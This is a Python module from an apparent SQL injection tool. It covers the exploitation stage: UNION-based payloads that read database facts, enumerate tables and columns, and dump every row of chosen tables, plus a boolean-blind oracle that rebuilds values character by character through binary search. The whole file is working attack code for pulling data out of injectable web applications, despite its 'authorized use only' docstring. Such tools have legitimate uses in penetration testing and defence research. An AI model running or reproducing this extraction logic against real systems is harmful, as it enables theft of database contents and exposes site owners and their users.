"""Data-extraction stage: pull data out once an injection is confirmed.

This is the exploitation half of the tool. A detector proves a parameter is
injectable and records how (channel + context); the Extractor then uses that
channel to read actual values from the database:

  - UNION channel  -> place a delimited expression in the reflected column and
                      parse the value straight out of the response. Fast; also
                      enumerates the current schema's table names.
  - Blind channel  -> reconstruct a value character-by-character via binary
                      search over a boolean oracle. Slower, so it extracts only
                      short scalars (current user / database) and is length-capped.

Authorized use only: this actively reads data from the target database.
"""

from __future__ import annotations

import re
import string
from dataclasses import dataclass, field
from difflib import SequenceMatcher

from .dbms import BOOLEAN_FINGERPRINTS
from .http_client import HttpClient
from .queries import CELL_SEP, Dialect, get_dialect
from .target import Target

_BOOL_SAME_THRESHOLD = 0.95


def _token() -> str:
    import random

    body = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    return f"xd{body}dx"


@dataclass
class ExtractionResult:
    channel: str
    dbms: str
    values: dict[str, str] = field(default_factory=dict)
    tables: list[str] = field(default_factory=list)
    notes: list[str] = field(default_factory=list)

    def is_empty(self) -> bool:
        return not self.values and not self.tables

    def to_dict(self) -> dict:
        return {
            "channel": self.channel,
            "dbms": self.dbms,
            "values": self.values,
            "tables": self.tables,
            "notes": self.notes,
        }


@dataclass
class TableDump:
    """Contents of a single table pulled from the target database."""

    table: str
    columns: list[str] = field(default_factory=list)
    rows: list[list[str]] = field(default_factory=list)
    row_count: int = 0          # total rows reported by COUNT(*)
    truncated: bool = False     # True when row_count exceeded the dump cap

    def to_dict(self) -> dict:
        return {
            "table": self.table,
            "columns": self.columns,
            "rows": self.rows,
            "row_count": self.row_count,
            "truncated": self.truncated,
        }


class Extractor:
    def __init__(self, max_str_len: int = 64):
        self.max_str_len = max_str_len

    async def _send(self, client: HttpClient, target: Target, param: str, value: str) -> str:
        params = target.mutate(param, value)
        if target.is_get():
            resp = await client.request(
                target.method, target.url, params=params, cookies=target.cookies
            )
        else:
            resp = await client.request(
                target.method, target.url, data=params, cookies=target.cookies
            )
        return resp.text

    async def extract(
        self,
        client: HttpClient,
        target: Target,
        param: str,
        finding: dict,
        dbms_name: str | None,
    ) -> ExtractionResult | None:
        dialect = get_dialect(dbms_name)
        detail = finding.get("detail", {})
        technique = finding.get("technique")
        if technique == "union-based":
            return await self._union(client, target, param, detail, dialect)
        if technique == "boolean-blind":
            return await self._boolean(client, target, param, detail, dialect)
        return None

    # ---- UNION channel -------------------------------------------------------

    def _make_union_reader(self, client, target, param, detail: dict, dialect: Dialect):
        """Return an async ``read(expr)`` that evaluates one scalar SQL expression
        over the UNION channel and returns its string value (or None)."""
        context = detail.get("context", "quote")
        cols = detail.get("columns", 1)
        pos = detail.get("reflected_position", 1)
        base = detail.get("base_value", "")
        prefix = f"{base}'" if context == "quote" else f"{base}"

        async def read(expr: str) -> str | None:
            s, e = _token(), _token()
            concat_expr = dialect.concat(s, expr, e)
            select = ["NULL"] * cols
            select[pos - 1] = concat_expr
            payload = f"{prefix} UNION ALL SELECT {','.join(select)}-- -"
            text = await self._send(client, target, param, payload)
            m = re.search(re.escape(s) + r"(.*?)" + re.escape(e), text, re.DOTALL)
            return m.group(1) if m else None

        return read

    async def _union(
        self, client: HttpClient, target: Target, param: str, detail: dict, dialect: Dialect
    ) -> ExtractionResult:
        result = ExtractionResult(channel="union-based", dbms=dialect.name)
        read = self._make_union_reader(client, target, param, detail, dialect)

        for fact_name, expr in dialect.facts.items():
            try:
                value = await read(expr)
            except Exception:
                value = None
            if value:
                result.values[fact_name] = value

        try:
            tables_raw = await read(dialect.tables_query)
        except Exception:
            tables_raw = None
        if tables_raw:
            result.tables = [t for t in tables_raw.split(",") if t]

        if result.is_empty():
            result.notes.append("UNION channel confirmed but no values could be parsed.")
        return result

    async def dump_tables(
        self,
        client: HttpClient,
        target: Target,
        param: str,
        detail: dict,
        dbms_name: str | None,
        tables: list[str],
        max_tables: int | None = None,
        max_rows: int | None = None,
    ) -> list[TableDump]:
        """Dump table contents over the UNION channel (whole-database extraction).

        For each table (all of them unless ``max_tables`` caps it) this enumerates
        the columns, reads the total row count, then pulls the rows (every row
        unless ``max_rows`` caps it) one request at a time. ``None`` means no cap.
        """
        dialect = get_dialect(dbms_name)
        read = self._make_union_reader(client, target, param, detail, dialect)
        dumps: list[TableDump] = []

        selected = tables if max_tables is None else tables[:max_tables]
        for table in selected:
            try:
                cols_raw = await read(dialect.columns_query(table))
            except Exception:
                cols_raw = None
            columns = [c for c in (cols_raw.split(",") if cols_raw else []) if c]
            if not columns:
                continue

            try:
                count_raw = await read(dialect.count_query(table))
                count = int(count_raw) if count_raw and count_raw.strip().isdigit() else 0
            except Exception:
                count = 0

            want = count if max_rows is None else min(count, max_rows)
            dump = TableDump(
                table=table,
                columns=columns,
                row_count=count,
                truncated=want < count,
            )
            for i in range(want):
                try:
                    row_raw = await read(dialect.row_value_expr(columns, table, i))
                except Exception:
                    row_raw = None
                if row_raw is None:
                    continue
                cells = row_raw.split(CELL_SEP)
                # Pad/truncate to the column count so exports stay rectangular.
                if len(cells) < len(columns):
                    cells += [""] * (len(columns) - len(cells))
                dump.rows.append(cells[: len(columns)])
            dumps.append(dump)

        return dumps

    # ---- Blind (boolean) channel --------------------------------------------

    def _boolean_payload(self, context: str, base: str, condition: str) -> str:
        if context == "single-quote":
            return f"{base}' AND {condition}-- -"
        if context == "double-quote":
            return f'{base}" AND {condition}-- -'
        return f"{base} AND {condition}"

    async def _make_oracle(self, client, target, param, context, base):
        """Return an async ``truth(condition)`` predicate over the boolean channel."""
        baseline = await self._send(client, target, param, base)

        async def truth(condition: str) -> bool:
            payload = self._boolean_payload(context, base, condition)
            text = await self._send(client, target, param, payload)
            return SequenceMatcher(None, baseline, text).ratio() >= _BOOL_SAME_THRESHOLD

        return truth

    async def blind_fingerprint(
        self, client: HttpClient, target: Target, param: str, detail: dict
    ) -> str | None:
        """Identify the DBMS on a silent target via boolean inference probes."""
        context = detail.get("context", "numeric")
        base = detail.get("base_value", "")
        truth = await self._make_oracle(client, target, param, context, base)
        for dbms, probe in BOOLEAN_FINGERPRINTS:
            try:
                if await truth(probe):
                    return dbms
            except Exception:
                continue
        return None

    async def _boolean(
        self, client: HttpClient, target: Target, param: str, detail: dict, dialect: Dialect
    ) -> ExtractionResult:
        context = detail.get("context", "numeric")
        base = detail.get("base_value", "")
        truth = await self._make_oracle(client, target, param, context, base)

        async def str_length(expr: str) -> int:
            lo, hi = 0, self.max_str_len
            while lo < hi:
                mid = (lo + hi + 1) // 2
                if await truth(f"{dialect.length_of(expr)}>={mid}"):
                    lo = mid
                else:
                    hi = mid - 1
            return lo

        async def char_code(expr: str, pos: int) -> int:
            lo, hi = 0, 127
            probe = dialect.char_at_code(expr, pos)
            while lo < hi:
                mid = (lo + hi) // 2
                if await truth(f"{probe}>{mid}"):
                    lo = mid + 1
                else:
                    hi = mid
            return lo

        async def read(expr: str) -> str:
            length = await str_length(expr)
            chars = []
            for i in range(1, min(length, self.max_str_len) + 1):
                code = await char_code(expr, i)
                if code == 0:
                    break
                chars.append(chr(code))
            return "".join(chars)

        result = ExtractionResult(channel="boolean-blind", dbms=dialect.name)
        # Reconstruct each fact (including the version banner) char-by-char. This
        # is what makes version fingerprinting work on silent targets, but it is
        # request-heavy, so values are length-capped by max_str_len.
        for fact_name, expr in dialect.facts.items():
            try:
                value = await read(expr)
            except Exception:
                value = ""
            if value:
                result.values[fact_name] = value

        result.notes.append(
            "Blind channel: values (including version) reconstructed via binary "
            f"search, capped at {self.max_str_len} characters; table enumeration "
            "is skipped here to bound request volume."
        )
        return result
